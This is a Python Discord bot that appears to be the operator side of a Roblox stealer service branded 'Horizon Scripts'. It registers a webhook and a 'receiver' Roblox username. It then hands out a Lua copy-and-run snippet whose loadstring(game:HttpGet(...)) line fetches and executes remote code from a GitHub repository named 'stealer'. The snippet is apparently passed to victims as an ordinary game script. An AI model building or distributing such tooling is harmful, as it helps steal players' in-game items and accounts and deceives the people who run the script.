import os
import time
import discord
from discord import app_commands
from discord.ext import commands
import httpx
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.environ["DISCORD_BOT_TOKEN"]
PROTECTOR_URL = os.environ["PROTECTOR_URL"].rstrip("/")
ADMIN_SECRET = os.environ["ADMIN_SECRET"]
ALLOWED_GUILD_ID = int(os.environ.get("ALLOWED_GUILD_ID", "0"))

# Roblox verification settings
ROBLOX_USERS_URL = "https://users.roblox.com/v1/users/search"
CACHE_TTL = 60  # seconds
_username_cache = {}

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

async def verify_roblox_username(username: str) -> tuple[bool, str]:

    key = username.lower()
    now = time.time()
    if key in _username_cache:
        expiry, exists = _username_cache[key]
        if now < expiry:
            if exists:
                return True, "ok"
            else:
                return False, "invalid usn"

    # API call
    try:
        async with httpx.AsyncClient(timeout=5) as client:
            resp = await client.get(
                ROBLOX_USERS_URL,
                params={"keyword": username, "limit": 10}
            )
    except httpx.RequestError as e:
        # If Roblox API is down, we fail open (allow generation) but log warning
        print(f"Roblox users API unreachable: {e} — failing open")
        return True, "ok"

    if resp.status_code != 200:
        print(f"Roblox users API returned {resp.status_code} — failing open")
        return True, "ok"

    data = resp.json()
    names = [u.get("name", "").lower() for u in data.get("data", [])]
    exists = username.lower() in names

    # Cache result
    _username_cache[key] = (now + CACHE_TTL, exists)

    if not exists:
        return False, "invalid usn"
    return True, "ok"


@bot.event
async def on_ready():
    if ALLOWED_GUILD_ID:
        guild = discord.Object(id=ALLOWED_GUILD_ID)
        tree.copy_global_to(guild=guild)
        await tree.sync(guild=guild)
    else:
        await tree.sync()
    print(f"Logged in as {bot.user} | Synced commands")


@tree.command(name="generate", description="Generate a Horizon Protector token for a webhook")
@app_commands.describe(
    username="Roblox username of the receiver",
    webhook="Discord webhook URL",
)
async def generate(interaction: discord.Interaction, username: str, webhook: str):
    await interaction.response.defer(ephemeral=True)

    # Validate webhook
    if "discord.com/api/webhooks/" not in webhook:
        await interaction.followup.send("Invalid webhook URL.", ephemeral=True)
        return

    valid, reason = await verify_roblox_username(username)
    if not valid:
        await interaction.followup.send(f"❌ {reason}", ephemeral=True)
        return

    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.post(
                f"{PROTECTOR_URL}/api/v3/token/register",
                json={"webhook_url": webhook, "username": username},
                headers={"x-admin-secret": ADMIN_SECRET},
            )
    except httpx.RequestError as e:
        await interaction.followup.send(f"Failed to reach Protector API: `{e}`", ephemeral=True)
        return

    if resp.status_code != 200:
        await interaction.followup.send(
            f"Protector API error `{resp.status_code}`: {resp.text[:200]}", ephemeral=True
        )
        return

    data = resp.json()
    token = data.get("token", "unknown")

    # Build the Lua script snippet
    lua_script = f'''user = "{username}"
id = "{token}"
loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-gag2", true))()'''

    embed = discord.Embed(
        title="Token Generated",
        description="**This token is shown only once!**",
        color=0x57F287,
    )
    embed.add_field(name="Username", value=f"`{username}`", inline=True)
    embed.add_field(name="Token", value=f"`{token}`", inline=True)
    embed.add_field(
        name="Lua Script (copy and run)",
        value=f"```lua\n{lua_script}\n```",
        inline=False
    )
    embed.set_footer(text="Horizon Scripts | Best Script Services")

    await interaction.followup.send(embed=embed, ephemeral=True)


@tree.command(name="revoke", description="Revoke a Horizon Protector token")
@app_commands.describe(token="The horizon$scripts-... token to revoke")
async def revoke(interaction: discord.Interaction, token: str):
    await interaction.response.defer(ephemeral=True)

    if not token.startswith("horizon$scripts-"):
        await interaction.followup.send("Invalid token format.", ephemeral=True)
        return

    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.post(
                f"{PROTECTOR_URL}/api/v3/token/revoke",
                json={"token": token},
                headers={"x-admin-secret": ADMIN_SECRET},
            )
    except httpx.RequestError as e:
        await interaction.followup.send(f"Failed to reach Protector API: `{e}`", ephemeral=True)
        return

    if resp.status_code == 200:
        await interaction.followup.send("Token revoked.", ephemeral=True)
    else:
        await interaction.followup.send(
            f"Revocation failed `{resp.status_code}` — {resp.text[:200]}", ephemeral=True
        )


bot.run(BOT_TOKEN)
